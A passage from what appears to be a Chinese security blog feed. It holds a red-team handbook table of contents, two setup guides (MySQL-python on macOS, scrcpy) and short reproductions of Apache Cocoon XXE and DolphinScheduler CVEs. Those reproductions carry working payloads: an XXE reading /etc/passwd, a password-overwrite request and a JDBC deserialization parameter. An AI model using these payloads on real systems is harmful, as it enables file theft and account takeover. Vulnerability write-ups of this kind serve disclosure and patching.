class="line">2.2.3.13   Solr Velocity 模板远程代码复现及利用指南</span><br><span class="line">2.2.3.14   SolrEaloeitymplate</span><br><span class="line">2.2.3.15   Java Webshell从入门到入狱系列2对抗之Bypass上篇</span><br><span class="line">2.2:3.16   Java Webshel1 从入门到入狱系列3对抗之Bypass</span><br><span class="line">2.2.3.17   Java Webshell 从入门到入球系列4对抗之Bypass一下篇</span><br><span class="line">2.2.3.18   Java&#39;反序列化过程深究</span><br><span class="line">2.2.3.19   Apache Solr不安全配置远程代码执行漏润复现及Jmx Rml利用分析</span><br><span class="line">2.2.3.20   Java命令执行小细节</span><br><span class="line">2.2.3.21   JDK反序列化Gadgets21</span><br><span class="line">2.2.3.22   WeblogicE1990alysis</span><br><span class="line">2.23.23  Spring Boottuators未授权漏淘</span><br><span class="line">2.2.3.24   SEMCMS2.6后台文件上传漏洞审计</span><br><span class="line">2.2.3.25   代码审计之Lvyecms后台Getshell</span><br><span class="line">2.2.3.26   Log4jserializealysis</span><br><span class="line">2.2.3.27   Java反序列化stJson 组件</span><br><span class="line">2.2.3.28   Springcuriyuth2(CVE1860)</span><br><span class="line">2.2.4      WAFpass</span><br><span class="line">2:2.5      登陆口JS前端加密绕过</span><br><span class="line">2.2.6      Xmldecoder标签</span><br><span class="line">2.2.7      利用 Php My Admin去Get Shell</span><br><span class="line">2.2.8      攻击JMT的一些方式</span><br><span class="line">2.2.9     上传漏洞 </span><br><span class="line">2.2.9.1   上传漏洞</span><br><span class="line">2.2.10    注入漏洞</span><br><span class="line">2.2.10.1   注入漏洞</span><br><span class="line">2.2.10.2   MSSQL利用总结</span><br><span class="line">2.2.10.3   攻击MSSQL—werUpSQL介绍</span><br><span class="line">2.2.10.4   如何利用Mysql安全特性发现漏洞</span><br><span class="line">2.2.10.5    Hibernate基本注入</span><br><span class="line">2.2.10.6    My Sql利用General_Log_File.Slow_Query_Log_File 写文件</span><br><span class="line">2.2.10.7   【会战分享】SQL Server注入Getshell</span><br><span class="line">2.2.11   文件读取漏洞</span><br><span class="line">2.2.12    Pentesterlab Xss</span><br><span class="line">2.2.13    Office宏的基本利用</span><br><span class="line">2.2.14    Javacuritylendar19ndyne</span><br><span class="line">2.2.15    Discuz Ssrf Rce漏洞分析报告</span><br><span class="line">2.2.16    WordPress语言文件代码执行漏洞分析报告</span><br><span class="line">2.2.17    Struts2远程命令执行S28 漏洞分析报告</span><br><span class="line">2.2.18   静态免杀Php一句话(已过D盾，河马，安全狗）</span><br><span class="line">2.2.19   金融信息系统安全测评方法</span><br><span class="line">2.2.20    ApacheiE一Analysis</span><br><span class="line">2.2.21   记一次阿里主站Xss测试及绕过WAF防护</span><br><span class="line">2.2.22    ClassLoader类加载机制</span><br><span class="line">2.2.23   浅谈SSRF原理及其利用</span><br><span class="line">2.2.24    Springtammons (CVE1873) </span><br><span class="line">2.2.25   Xss绕过代码后端长度限制的方法</span><br><span class="line">2.2.26   Mysql提权之MOF</span><br><span class="line">2.2.27   Mysql提权之UDF</span><br><span class="line">2.2.28    Xss基础学习</span><br><span class="line">2.2.29    Java反射与内存Shell初探Jetty容器的Shell维权</span><br><span class="line">2.2.30   利用DNSLOG回显</span><br><span class="line">2.2.31   文件合成&#x2F;图片马生成</span><br><span class="line">2.2.32    UDF 提权</span><br><span class="line">2.4   社会工程学</span><br><span class="line">2.4.1   水坑攻击</span><br><span class="line">2.4.2   鱼叉攻击 </span><br><span class="line">2.4.2.1   Swaks邮件伪造</span><br><span class="line">2.4.2.2   邮件伪造防御技术</span><br><span class="line">2.4.3   钓鱼攻击 </span><br><span class="line">2.4.3.1   视觉效果 </span><br><span class="line">2.4.3.1.1   凭证劫持漏洞</span><br><span class="line">2.4.3.2   克隆技术</span><br><span class="line">2.4.3.3    Word文档云宏代码钓鱼</span><br><span class="line">2.2.5    APP密码算法通用分析方法</span><br><span class="line">2.2.6   Linux下反弹shell命令</span><br><span class="line">2.2.7   Browser Pivot for Chrome</span><br><span class="line">第三章  命令与控制</span><br><span class="line">3.1   HTTP隧道ABPTTS第一季</span><br><span class="line">3.2   HTTP隧道reGeorg第二季 </span><br><span class="line">3.3   HTTP隧道Tunna第三季</span><br><span class="line">3.4   HTTP隧道reDuh第四季</span><br><span class="line">3.5   基于Ptunnel建立ICMP隧道</span><br><span class="line">3.6   使用anydesk做远控</span><br><span class="line">3.7   防御域内委派攻击</span><br><span class="line">3.8   ATT&amp;CK攻防初窥系列执行篇</span><br><span class="line">3.9   Powershell</span><br><span class="line">3.9.1   利用36O正则不严执行powershell上线</span><br><span class="line">3.9.2   关于Powershell对抗安全软件</span><br><span class="line">3.9.3   InvokeObfuscation介绍</span><br><span class="line">第四章  穿透与转发</span><br><span class="line">4.1   Frp内网穿透实战</span><br><span class="line">4.2   基于Portfwd端口转发</span><br><span class="line">4.3   Venom代理转发、多级穿透</span><br><span class="line">4.4   DNS隧道</span><br><span class="line">4.4.1   DNS隧道之DNS 2 TCP</span><br><span class="line">4.4.2   DNS隧道之DNSCAT 2</span><br><span class="line">4.4.3   使用DNS协议上线MSF 之Iodine篇</span><br><span class="line">4.4.4   使用DNS协议上线MSF 之DNSCAT2篇</span><br><span class="line">4.4.5   使用DNS协议上线MSF之 DNS 2 TCP篇</span><br><span class="line">第五章  内部信息搜集</span><br><span class="line">5.1   本地信息搜集 </span><br><span class="line">5.1.1   用普通权限的域帐户获得域环境中所有DNS解析记录</span><br><span class="line">5.1.2   凭证及令牌票据</span><br><span class="line">5.1.3.1   内存转储获取本地HASH</span><br><span class="line">5.1.4.2   转储域账户哈希值</span><br><span class="line">5.1.5.3   转储域账户哈希值(续)</span><br><span class="line">5.1.6.4   SPN发现与利用</span><br><span class="line">5.1.7.5   哈希传递远程登录篇</span><br><span class="line">5.1.3   用户习惯</span><br><span class="line">5.1.3.1   从目标文件中做信息搜集第一季</span><br><span class="line">5.1.4   获取当前系统所有用户的谷歌浏览器密码</span><br><span class="line">5.1.5   Windows2003获取密码之Adsutil.wbs</span><br><span class="line">5.1.6   解密目标机器保存的rdp 凭证</span><br><span class="line">5.1.7   HASHcat破解HASH 神器详解</span><br><span class="line">5.1.8   解密SecureCRT客户端中保存的密码HASH</span><br><span class="line">5.1.9   解密Winscp客户端中保存的密码HASH</span><br><span class="line">5.1.10  破解Weblogic配置文件中的数据库密码</span><br><span class="line">5.1.11  获取域控&#x2F;系统日志.</span><br><span class="line">5.2   网络信息搜集</span><br><span class="line">5.2.1   发现目标Web程序敏感目录第一季</span><br><span class="line">5.2.2   基于SCF做目标内网信息搜集第二季</span><br><span class="line">5.2.3   域环境信息搜集</span><br><span class="line">5.2.3.1   Active Directory Domain Services获取域控信息</span><br><span class="line">5.2.3.2   Windows域渗透―用户密码枚举</span><br><span class="line">5.2.3.3   不同环境下域DNS记录信息收集方法 </span><br><span class="line">5.2.3.4   Impacket框架之域信息获取 </span><br><span class="line">5.2.3.5   域信息收集之user2sid，sid2user</span><br><span class="line">5.2.4   工作组环境信息搜集</span><br><span class="line">5.2.4.1   基于MSF发现内网存活主机第一季</span><br><span class="line">5.2.4.2   基于MSF发现内网存活主机第二季</span><br><span class="line">5.2.4.3   基于MSF发现内网存活主机第三季</span><br><span class="line">5.2.4.4   基于MSF发现内网存活主机第四季</span><br><span class="line">5.2.4.5   基于MSF发现内网存活主机第五季</span><br><span class="line">5.2.4.6   基于MSF发现内网存活主机第六季</span><br><span class="line">5.2.4.7   基于SqlDataSourceEnumerator发现内网存活主机</span><br><span class="line">5.2.4.8   基于ICMP发现内网存活主机.</span><br><span class="line">5.2.4.9   基于UDP发现内网存活主机·</span><br><span class="line">5.2.4.10   基于ARP发现内网存活主机</span><br><span class="line">5.2.4.11   基于Snmp发现内网存活主机</span><br><span class="line">5.2.4.12   基于Netbios发现内网存活主机</span><br><span class="line">5.2.5   Powershell一条命令行进行内网扫描.</span><br><span class="line">5.2.6   内网信息收集之内网代理</span><br><span class="line">第六章  权限提升</span><br><span class="line">6.1   操作系统提权·</span><br><span class="line">6.1.1   Linux </span><br><span class="line">6.1.1.1   Linux提权依赖exp篇（第二课）</span><br><span class="line">6.1.1.2   Sudo 漏洞分析（CVE201914287)</span><br><span class="line">6.1.1.3   linux提权(一)之内核提权·</span><br><span class="line">6.1.2   Windows</span><br><span class="line">6.1.2.1    Windows提权快速查找EXP（第一课）·</span><br><span class="line">6.1.2.2   Token窃取与利用 </span><br><span class="line">6.1.2.3   CVE20191388 Windows UAC</span><br><span class="line">第七章  权限维持</span><br><span class="line">7.1   操作系统后门 </span><br><span class="line">7.1.1    Linux </span><br><span class="line">7.1.2    Windows    </span><br><span class="line">7.1.2.1   对抗权限长期把控伪造无效签名第一季</span><br><span class="line">7.1.2.2   常见Windows持久控制总结</span><br><span class="line">7.1.2.3   Windows RID 劫持.</span><br><span class="line">7.1.2.4   Shfit映像劫持后门新玩法</span><br><span class="line">7.1.2.5   Windows权限维持篇注册表维权–.</span><br><span class="line">7.1.2.6   Windows权限维持篇2计划任务维权·</span><br><span class="line">7.1.2.7   Windows权限维持篇3服务Service维权</span><br><span class="line">7.2   第三方组件后门.</span><br><span class="line">7.3   APT对抗〔一）红蓝对抗关于后门对抗</span><br><span class="line">7.4   APT对抗二）红蓝对抗关于后门对抗</span><br><span class="line">7.5   APT对抗（三）红蓝对抗关于后门对抗</span><br><span class="line">7.6   APT对抗（四）红蓝对抗关于后门对抗·</span><br><span class="line">7.7   DLL劫持两种劫持方法剖析</span><br><span class="line">7.8   APT对抗（五）红蓝对抗关于后门对抗·</span><br><span class="line">7.9   APT对抗（六）红蓝对抗关于后门对抗·</span><br><span class="line">7.10  APT对抗（七）红蓝对抗关于后门对抗.</span><br><span class="line">7.11  ATT&amp;CK攻防初窥系列横向移动篇·</span><br><span class="line">7.12  Linux权限维持之LD_PRELOAD </span><br><span class="line">7.13  Linux权限维持之进程注入</span><br><span class="line">7.14  Windows权限维持之Office启动</span><br><span class="line">第八章 内网渗透基础</span><br><span class="line">8.1  Kerberos协议 </span><br><span class="line">8.1.1   Windows认证原理之Kerberos篇</span><br><span class="line">8.2  NTLM    </span><br><span class="line">8.2.1  NTLM协议及HASH 抓取</span><br><span class="line">8.2.2  Windows 认证原理之NTLM篇</span><br><span class="line">8.3  内网命令行渗透笔记.</span><br><span class="line">8.4  内网渗透中的文件传输第一季</span><br><span class="line">8.5  Msfvenom常用生成Payload命令</span><br><span class="line">8.6  Windows环境压缩文件&amp;文件夹命令合集</span><br><span class="line">8.7  Windows net命令集使用</span><br><span class="line">8.8  CobaltStrike 与Metasploit实战联动</span><br><span class="line">8.9  渗透中常用的复制工具</span><br><span class="line">第九章 红队自研</span><br><span class="line">9.1  免杀方案研发</span><br><span class="line">9.1.1  实战免杀诺顿Shellcode载入内存免杀</span><br><span class="line">9.1.2  人人都能过杀软</span><br><span class="line">9.1.3  远控木马极速免杀360五引擎 </span><br><span class="line">9.1.4  基于Ruby内存加载Shellcode第一季</span><br><span class="line">9.1.5  DLL加载Shellcode 免杀上线</span><br><span class="line">9.1.6  借助Aspx对Payload进行分离免杀·</span><br><span class="line">9.1.7  静态恶意代码逃逸(第一课)</span><br><span class="line">9.1.8  静态恶意代码逃逸(第二课).</span><br><span class="line">9.1.9  静态恶意代码逃逸∈第三课) </span><br><span class="line">9.1.10  静态恶意代码逃逸（第四课）</span><br><span class="line">9.1.11  静态恶意代码逃逸（第五课）</span><br><span class="line">9.1.12  基于Python内存加载Shellcode第二季</span><br><span class="line">9.1.13  Payload分离免杀思路– </span><br><span class="line">9.1.14  基于实战中的Small Payload应用——第一季</span><br><span class="line">9.1.15  基于实战中的Small Payload应用——第二季.</span><br><span class="line">9.1.16  基于Go内存加载Shellcode第三季.</span><br><span class="line">9.1.17  免杀技术之msf偏执模式</span><br><span class="line">9.1.18  免杀技术之生成Shellcode自行编译·</span><br><span class="line">9.1.19  免杀技术之代码加密·</span><br><span class="line">9.1.20  免杀技术之使用c实现Meterpreter功能</span><br><span class="line">9.1.21  白加黑免杀过360开机启动拦截·</span><br><span class="line">9.1.22  使用C#实现简单的分离兔杀</span><br><span class="line">第十章 安全工具教学</span><br><span class="line">10.1   Impacket套件之远程命令执行功能讲解.</span><br><span class="line">10.2   Bloodhound 技术讲解</span><br><span class="line">10.3   Windows 10配置搭建Kali环境第一季.</span><br><span class="line">10.4   与CrackMapExec结合攻击   </span><br><span class="line">10.5   Meterpreter下的Irb操作第一季</span><br><span class="line">10.6   基于第十课补充Payload(—)</span><br><span class="line">10.7   基于第十课补充 Payload(二)  </span><br><span class="line">10.8   域信息收集之普通域用户权限获取域里详细信息ldifde工具</span><br><span class="line">10.9   域信息收集csvde工具</span><br><span class="line">10.10  xSS 之Beef神器―.</span><br><span class="line">10.11  Pstools讲解(远程执行命令&amp;登录日志导出等)</span><br><span class="line">10.12  Netcat使用总结</span><br><span class="line">10.13  五分钟快速编写漏洞EXP </span><br><span class="line">第十一章 红队技巧</span><br><span class="line">11.1  基于白名单Msbuild.exe执行Payload第一季</span><br><span class="line">11.2  基于白名单Installutil.exe执行Payload第二季</span><br><span class="line">11.3  基于白名单regasm.exe执行Payload第三季 </span><br><span class="line">11.4  基于白名单regsvcs.exe执行Payload第四季</span><br><span class="line">11.5  基于白名单Mshta.exe执行Payload第五季</span><br><span class="line">11.6  基于白名单Compiler.exe执行Payload第六季</span><br><span class="line">l1.7  基于白名单Csc.exe执行Payload第七季</span><br><span class="line">11.8  基于白名单Msiexec执行Payload第八季</span><br><span class="line">11.9  基于白名单Regsvr32执行Payload第九季</span><br><span class="line">11.10 基于白名单Wmic执行Payload第十季</span><br><span class="line">11.11 基于白名单RunDLL32.exe执行Payload第十一季</span><br><span class="line">l1.12 基于白名单Odbcconf执行Payload第十二季·</span><br><span class="line">11.13 基于白名单PsExec执行Payload第十三季.</span><br><span class="line">11.14 基于白名单Forfiles执行Payload第十四季</span><br><span class="line">11.15 基于白名单Pcalua执行Payload第十五季</span><br><span class="line">11.16 基于白名单Cmstp.exe执行Payload第十六季·</span><br><span class="line">11.17 基于白名单Ur1.DLL执行Payload第十七季</span><br><span class="line">11.18 基于白名单zipfldr.DLL执行Payload第十八季</span><br><span class="line">11.19 基于白名单msiexec执行Payload补充</span><br><span class="line">11.20 基于白名单Ftp.exe执行Payload第十九季―.</span><br><span class="line">11.21 网络安全学习方法论之体系的重要性</span><br><span class="line">第十二章 工具优化及分享</span><br><span class="line">12.1  解决Msfvenom命令自动补全</span><br><span class="line">12.2  工具介绍thebackdoorfactory（第九课）</span><br><span class="line">12.3  工具介绍VeilEvasion(第十一课）</span><br><span class="line">12.4  离线CyberChef使用指南·</span><br><span class="line">第十三章  案例分享</span><br><span class="line">13.1  某次项目技术点实录Regsvr32 ole对象·</span><br><span class="line">13.2  阿里云Access Token问题–项目收获记录</span><br><span class="line">13.3  从打点到域控的练习 </span><br><span class="line">13.4  安防软件 Bypass</span><br><span class="line">13.5  Docker常用命令与Docker逃逸漏洞复现</span><br><span class="line">13.6  渗透沉思录  </span><br><span class="line">13.7  项目回忆:体系的本质是知识点串联</span><br><span class="line">13.9  漏洞修复系列之Oracle远程数据投毒漏洞修复(非RAC环境)</span><br><span class="line">13.10 记一次Ueditor老版本的非常规Getshell </span><br><span class="line">13.11 云安全共测大赛初赛Game App题目解析</span><br><span class="line">13.12 三层靶机搭建及其内网渗透（附靶场环境）</span><br><span class="line">13.13 记一次简单的漏洞利用与横向.</span><br><span class="line">13.14 翻译文章   </span><br><span class="line">13.14.1    CVE201912757:Symantec Endpoint Protection中的本地特权升级</span><br><span class="line">13.14.2    攻击SQLServer CLR程序集 </span><br><span class="line">13.14.3    AMTHoneypot蜜罐指南（翻译）</span><br><span class="line">13.14.4    Honeypotcamera蜜罐指南(翻译）</span><br><span class="line">13.14.5    (译文)Cobalt Strike使用混淆绕过WindowsDefender</span><br><span class="line">13.15      渗透实战从打点到域控的全过程</span><br><span class="line">13.16      Docker极速入门 </span><br><span class="line">13.17      记一次应急响应样本分析</span><br><span class="line">第十四章  运营</span><br><span class="line">14.1      如何将金字塔原理在运营中应用</span><br><span class="line">14.2      活动心得——如何举办一场沙龙活动 </span><br><span class="line">14.3      从用户中来，到用户中去</span><br><span class="line">14.4      文章与活动之间的关联﻿</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>红队百科全书</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac os 安装Mysql-Python</title>
    <url>/2020/08/01/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Mac-os-%E5%AE%89%E8%A3%85Mysql-Python/</url>
    <content><![CDATA[<h1 id="Mac-os-安装Mysql-python"><a href="#Mac-os-安装Mysql-python" class="headerlink" title="Mac os 安装Mysql-python"></a>Mac os 安装Mysql-python</h1><h2 id="安装环境情况"><a href="#安装环境情况" class="headerlink" title="安装环境情况"></a>安装环境情况</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/version1.png" width="300" height="200">

<a id="more"></a>

<h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install MySql-python</span><br></pre></td></tr></table></figure>
<p><strong>通常这样是行不通的</strong></p>
<h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0. brew install mysql</span><br><span class="line">1. brew unlink mysql # 如果已经安装</span><br><span class="line">2. brew install mysql-connector-c # 安装mysql依赖文件</span><br><span class="line">3. which mysql_config # 查看本地mysql_config 文件在哪</span><br><span class="line">4. vim mysql_config 找到</span><br><span class="line">    libs&#x3D;&quot;$libs -l&quot;</span><br><span class="line">    替换为</span><br><span class="line">    lib&#x3D;&quot;$libs -lmysqlclient -lssl -lcrypto&quot;</span><br><span class="line">    # 新版mysql可能已经替换</span><br><span class="line">5. pip install mysqlclinet</span><br><span class="line">6. pip install MySql-python</span><br><span class="line">7. brew unlink mysql-connector-c</span><br><span class="line">8. brew link mysql</span><br></pre></td></tr></table></figure>

<h2 id="遇见错误"><a href="#遇见错误" class="headerlink" title="遇见错误"></a>遇见错误</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_mysql.c:36:10: fatal error: &#39;my_config.h&#39; file not found</span><br><span class="line">#include &quot;my_config.h&quot;</span><br><span class="line">         ^~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br><span class="line">error: command &#39;cc&#39; failed with exit status 1</span><br></pre></td></tr></table></figure>

<h2 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h2><p><strong>1. 未安装mysql-connector-c 缺少对应库</strong><br><strong>2. 安装了新版的mysql默认没有my_config文件</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/my_config.png" width="800" height="300"></p>
<p>**这是mysql 8.0.19默认库文件，确实没有my_config.h，这个时候我们需要copy一份</p>
<p>将mysql.h copy 一份重命名为 my_config.h<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/cp.png" width="800" height="70"></p>
<p><strong>然后在进行安装即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install MySql-python</span><br></pre></td></tr></table></figure>

<p>参考stackoverflow，原文：<a href="https://stackoverflow.com/questions/12218229/my-config-h-file-not-found-when-install-mysql-python-on-osx-10-8">stackoverflow</a></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>Mysql-python</tag>
      </tags>
  </entry>
  <entry>
    <title>scrcpy使用</title>
    <url>/2020/08/04/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/scrcpy%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="scrcpy使用"><a href="#scrcpy使用" class="headerlink" title="scrcpy使用"></a>scrcpy使用</h2><blockquote>
<p>简单地来说，scrcpy就是通过adb调试的方式来将手机屏幕投到电脑上，并可以通过电脑控制您的Android设备。它可以通过USB连接，也可以通过Wifi连接（类似于隔空投屏），而且不需要任何root权限，不需要在手机里安装任何程序。scrcpy同时适用于GNU / Linux，Windows和macOS。</p>
</blockquote>
<p>它的一些特性：</p>
<ul>
<li>亮度（原生，仅显示设备屏幕）</li>
<li>性能（30~60fps）</li>
<li>质量（1920×1080或以上）</li>
<li>低延迟（35~70ms）</li>
<li>启动时间短（显示第一张图像约1秒）</li>
<li>非侵入性（设备上没有安装任何东西）</li>
</ul>
<p>此项目为开源项目，Github地址：<a href="https://github.com/Genymobile/scrcpy">Genymobile/scrcpy: Display and control your Android device</a></p>
<a id="more"></a>

<h2 id="使用scrcpy的要求"><a href="#使用scrcpy的要求" class="headerlink" title="使用scrcpy的要求"></a>使用scrcpy的要求</h2><ol>
<li>Android设备至少需要API 21（Android 5.0以上版本）;</li>
<li>确保在您的设备上启用了<a href="https://developer.android.com/studio/command-line/adb.html#Enabling">adb调试</a>;</li>
<li>在某些设备上，您还需要启用<a href="https://github.com/Genymobile/scrcpy/issues/70#issuecomment-373286323">其他选项</a>以使用键盘和鼠标控制它。</li>
</ol>
<h2 id="使用USB进行连接"><a href="#使用USB进行连接" class="headerlink" title="使用USB进行连接"></a>使用USB进行连接</h2><p>此方式推荐使用，相对更加流畅。</p>
<ol>
<li>手机通过USB连接到PC上，首次连接会弹出是否信任该电脑，点击始终信任即可。</li>
<li>运行<code>adb usb</code>查看是否连接成功</li>
</ol>
<h2 id="使用无线连接"><a href="#使用无线连接" class="headerlink" title="使用无线连接"></a>使用无线连接</h2><p>可参考官方文档：<a href="https://www.genymotion.com/blog/open-source-project-scrcpy-now-works-wirelessly/">Open Source Project - Scrcpy now works wirelessly</a></p>
<p>此连接方式更加方便快捷，若宽带速率高，使用效果更佳，使用方法也非常简单。</p>
<ol>
<li>确保PC和手机在同一Wifi中</li>
<li>手机先通过USB与PC相连</li>
<li>在PC上运行 adb tcpip 服务端口，如端口为5555</li>
<li>拔下你的设备，断开USB连接</li>
<li>在PC上运行 adb connect 手机IP:服务端口（手机IP可通过手机的<code>状态信息</code>查看，或者登录路由器查看，一般以192.168开头）</li>
<li>运行scrcpy，在cmd中输入<code>scrcpy.exe</code></li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200905170438521-9918429.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-9918429.png" alt="img"></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>scrcpy</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Cocoon XML注入 (CVE-2020-11991)</title>
    <url>/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/</url>
    <content><![CDATA[<p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p>
<a id="more"></a>

<p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914145811723.png" alt="image-20200914145811723"></p>
<p>参考链接：<a href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache-Cocoon-XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</title>
    <url>/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码<br>api interface /dolphinscheduler/users/update</p>
<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.2</p>
<a id="more"></a>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165719031.png" alt="image-20200917165719031"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;users&#x2F;update</span><br><span class="line">userName&#x3D;admin&amp;userPassword&#x3D;Password1!&amp;tenantId&#x3D;1&amp;email&#x3D;sdluser%40sdluser.sdluser&amp;phone&#x3D;&amp;id&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170117506.png" alt="image-20200917170117506"></p>
<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>建议用户将 Apache DolphinScheduler 升级到安全版本。</p>
<p>下载链接：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache DolphinScheduler远程代码执行(CVE-2020-11974)</title>
    <url>/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/</url>
    <content><![CDATA[<h2 id="Apache-DolphinScheduler组件介绍"><a href="#Apache-DolphinScheduler组件介绍" class="headerlink" title="Apache DolphinScheduler组件介绍"></a>Apache DolphinScheduler组件介绍</h2><p>​    Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.1</p>
<a id="more"></a>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>需要登陆权限</p>
<p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170923674.png" alt="image-20200917170923674"></p>
<p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170947012.png" alt="image-20200917170947012"></p>
<p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917171000453.png" alt="image-20200917171000453"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp;</span><br><span class="line">principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure>



<p>关于MySQL JDBC客户端反序列化漏洞的相关参考：</p>
<p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Horde Groupware Webmail Edition 远程命令执行</title>
